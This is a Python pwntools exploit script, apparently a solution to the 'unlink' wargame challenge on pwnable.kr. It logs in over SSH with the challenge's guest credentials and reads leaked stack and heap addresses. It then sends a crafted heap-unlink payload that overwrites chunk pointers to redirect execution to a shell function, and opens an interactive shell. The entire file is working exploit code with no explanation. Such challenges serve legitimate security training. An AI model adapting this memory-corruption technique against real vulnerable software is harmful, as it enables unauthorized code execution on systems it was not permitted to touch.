from pwn import *

def pack(addr):
    i = struct.pack('<I', addr)
    return i

r = ssh(host='pwnable.kr', port=2222,
        user='unlink',
        password='guest')
p = r.process(["./unlink"])

sal = int(p.recvline().split('here is stack address leak:')[1][:-1], 16)
hal = int(p.recvline().split('here is heap address leak:')[1][:-1], 16)

A = hal
B_buf = hal + 0x24

print 'sal', hex(sal)
print 'hal', hex(hal)

p.recvline()

main_eip = sal + 0x10
shell = 0x080484eb

# B->bk  <= main eip address
# B->fd  <= A->buf (with shell address)
# B->buf <= shell address

buffer = ''
buffer += pack(0) # A->buf
buffer += pack(0) # A->buf
buffer += pack(0) # 0x0

# B
buffer += pack(0x19)
buffer += pack(B_buf)       # B->fd
buffer += pack(main_eip)    # B->bk
buffer += pack(shell)       # B->buf
buffer += pack(0x0)         # B->buf
buffer += pack(0x0)         # B->buf

p.send(buffer)

p.interactive()